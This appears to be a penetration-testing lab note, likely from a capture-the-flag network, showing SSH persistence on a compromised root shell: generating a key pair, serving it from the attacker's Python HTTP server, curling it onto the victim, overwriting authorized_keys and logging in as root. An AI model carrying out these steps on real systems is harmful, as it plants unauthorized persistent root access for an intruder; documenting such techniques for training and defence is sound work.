g   #### Create Public/Private Key 
```bash
┌──(root💀gobots)-[18Jun2024 21:06:42]-[~/.ssh] 
└─# ssh-keygen -b 4096 -t rsa -f id_rsa  \                                                      
Generating public/private rsa key pair.                                                        
Enter passphrase (empty for no passphrase):                                                    
Enter same passphrase again:                                                                   
Your identification has been saved in id_rsa                                                   
Your public key has been saved in id_rsa.pub                                                   
The key fingerprint is:                                                                                                                        
SHA256:1Ns4TaxcovpU008fQ/ZDmk4K/3Nyg1kYbtwk5kH8x4U root@gobots                                                                                                                                              
The key's randomart image is:     

+---[RSA 4096]----+                                                                                                                            
|            .  . |                                                                                                                            
|         . . oE .|                                                                                                                            
|        . o = .=.|                                                                                                                            
|       . o @ =*o+|                                                                                                                            
|        S.O O+O+o|                                                                                                                            
|       . .oo+O ++|                                                                                                                            
|      . .  o..= .|                                                                                                                            
|       o    .= + |                                                                                                                            
|        .    .= .|                                                                                                                            
+----[SHA256]-----+                   
```
#### Check to make sure that it was created
```bash
┌──(root💀gobots)-[18Jun2024 21:07:42]-[~/.ssh]                                                                                               
└─# ls                                                                                                                                                                                                      
id_rsa  id_rsa.pub 
```
#### Host HTTP server
```bash
┌──(root💀gobots)-[18Jun2024 21:07:47]-[~/.ssh]                                                                                               
└─# python3 -m http.server 8001                                                                                                                                                                             
Serving HTTP on 0.0.0.0 port 8001 (http://0.0.0.0:8001/) ...
10.10.110.21 - - [18/Jun/2024 21:08:24] "GET /id_rsa HTTP/1.1" 200 -
10.10.110.21 - - [18/Jun/2024 21:08:40] "GET /id_rsa.pub HTTP/1.1" 200 -
10.10.110.21 - - [18/Jun/2024 21:08:57] "GET /id_rsa.pub HTTP/1.1" 200 -
```
#### Curl public and private key to victim
```bash
root@web01:~/.ssh# curl http://10.10.14.39:8001/id_rsa -o id_rsa                                                                                                                                            
curl http://10.10.14.39:8001/id_rsa -o id_rsa                                                                                                                                                               
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                                                                                                             
                                 Dload  Upload   Total   Spent    Left  Speed                                                                                                                               
100  3381  100  3381    0     0  47619      0 --:--:-- --:--:-- --:--:-- 47619

root@web01:~/.ssh# curl http://10.10.14.39:8001/id_rsa.pub -o id_rsa.pub
curl http://10.10.14.39:8001/id_rsa.pub
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   737  100   737    0     0  12081      0 --:--:-- --:--:-- --:--:-- 12081

```
#### cat public key to authorized_keys folder
```bash
root@web01:~/.ssh# cat id_rsa.pub > authorized_keys
cat id_rsa.pub > authorized_keys
root@web01:~/.ssh# cat authorized_keys
cat authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDKZmgnYB3mBIpU0st0+bp3/6DBos8cWwPiB9XnVg5wLviIeGMksYP+XL/cTFFKU/0+GUBu8QRlYnNPaWv8F+c+Ley165WpjLKN/ggsPToJRYrquDMwVzja7Z5drdiptrdKs0tuLeW3eV9typoLkKVgT9jLFl99vg3X8eaxZWi02d4itktE8+lKK8l+ajjiXklzYHtHNC+q5Kajh81IyxGPgFKkDYRup1LSeoyFP3x4g0C+o3KSY2gwNZyN8E9dLlDOx1zrz/BEhUp0hmb3iov7dmVsw5pxhGeaCqtVUiwQqvkXa63VQsXgBWPrbXOSk4ZuhFUKJ5UpfPg2glxofva0R01GhMxWJ57yv+aBIrMK0kPLV/joUgr0yW6PTCdnQ85uuftnQZVllOXLhHCBZNBv+nWLbqiRuX+VsN/BnmoqwIsaK+S82mNYY2qAxjzT2U9IDVggmfCMGnyxwG+xQcMoP50iRh88m07a7Kh16dsRpy8oqdmoJLhM3rSIBe1l6pkWE6wgNldapLDvaVvCCq3yW2uOpiUts+8jMY+V0NBYvNl8KK3Qwb59mmgpxA1QiwlsBLe6+XYigJcwgwiOqoSZSYcGbD9OSSAAfmVhbm/Oacs48TKGGsNyIBanRzy8q6ukOt3DaSTCBYwMSNSJED9ZMKlJrzsJ6vX4qDpYASHpXw== root@gobots

```
#### ssh in
```bash
┌──(root💀gobots)-[18Jun2024 21:09:45]-[~/.ssh]
└─# ssh -i id_rsa root@10.10.110.21
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-154-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Jun 18 21:11:05 UTC 2024

  System load:  0.17               Users logged in:        0
  Usage of /:   73.2% of 13.66GB   IP address for eth0:    10.10.110.21
  Memory usage: 12%                IP address for eth1:    172.16.0.21
  Swap usage:   0%                 IP address for lxcbr0:  10.0.3.1
  Processes:    176                IP address for docker0: 172.17.0.1


202 updates can be applied immediately.
160 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Apr 10 14:16:55 2024
root@web01:~# 

```